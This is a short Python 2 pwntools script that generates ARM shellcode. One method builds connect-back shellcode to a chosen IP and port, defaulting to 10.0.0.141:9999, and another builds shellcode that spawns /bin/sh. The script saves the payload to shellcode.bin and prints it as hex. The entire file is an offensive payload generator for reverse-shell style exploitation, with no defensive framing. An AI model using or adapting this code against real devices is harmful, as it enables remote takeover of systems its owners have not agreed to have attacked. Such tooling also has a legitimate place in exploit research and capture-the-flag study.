# -*- coding: UTF-8 -*-
"""
This code for operating ShellCode
"""
from pwn import *
import pwnlib.asm as asm
import pwnlib.elf as elf

class ShellCodeGen(object):
    def __init__(self, arch='arm', shellcode_path='shellcode.bin'):
        self.arch = arch
        self.shellcode_path = shellcode_path
        
    def gen_connect_shellcode(self, ip, port):
        # socket connect(ip,port) connect_fd=r6
        connect_asm = shellcraft.arm.connect(ip, port) 
        shellcode = asm.asm(connect_asm, arch=self.arch)
        print connect_asm
        with open(self.shellcode_path, 'wb') as f:
            f.write(shellcode)

    def gen_sh_shellcode(self, cmd):
        # execve
        sh_asm = shellcraft.arm.sh()
        shellcode = asm.asm(sh_asm, arch=self.arch)
        print sh_asm
        with open(self.shellcode_path, 'wb') as f:
            f.write(shellcode)

    def save_shellcode_by_hex(self, shellcode_hex):
        with open(self.shellcode_path, 'wb') as f:
            f.write(shellcode_hex)

    def load_shellcode(self):
        with open(self.shellcode_path, 'rb') as f:
            shellcode = f.read()
         
        while len(shellcode) % 4 != 0:
          shellcode += '\x00'

        return shellcode

if __name__ == '__main__':
    if len(sys.argv) > 2:
        ip = sys.argv[1]
        port = int(sys.argv[2])
        print 'start genshellcode connect ip=%s,port=%d' % (ip, port)
        shellcode_gen = ShellCodeGen(shellcode_path='shellcode.bin')
        shellcode_gen.gen_connect_shellcode(ip, port)
        shellcode = shellcode_gen.load_shellcode()
        print shellcode.encode('hex')

    else:
        shellcode_gen = ShellCodeGen(shellcode_path='shellcode.bin')
        shellcode_gen.gen_connect_shellcode("10.0.0.141", 9999)
        #shellcode_gen.save_shellcode_by_hex()
        shellcode = shellcode_gen.load_shellcode()
        print shellcode.encode('hex')

